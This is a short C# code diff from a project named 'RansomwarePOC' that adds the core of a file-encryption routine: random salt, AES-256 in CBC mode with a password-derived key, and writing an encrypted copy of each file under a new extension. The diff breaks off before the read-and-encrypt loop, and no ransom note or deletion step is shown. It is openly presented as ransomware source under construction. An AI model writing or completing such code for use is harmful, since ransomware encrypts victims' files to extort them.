@@ -122,7 +122,29 @@ namespace RansomwarePOC
         }
         private static void FileEncrypt(string inputFile, string password)
         {
-           
+            byte[] salt = GenerateRandomSalt();
+            FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);
+
+            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
+
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            AES.Padding = PaddingMode.PKCS7;
+            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+            AES.Mode = CipherMode.CBC;
+            fsCrypt.Write(salt, 0, salt.Length);
+
+            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
+
+            FileStream fsIn = new FileStream(inputFile, FileMode.Open);
+
+            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
+            byte[] buffer = new byte[1048576];
+            int read;
         }
 
     }
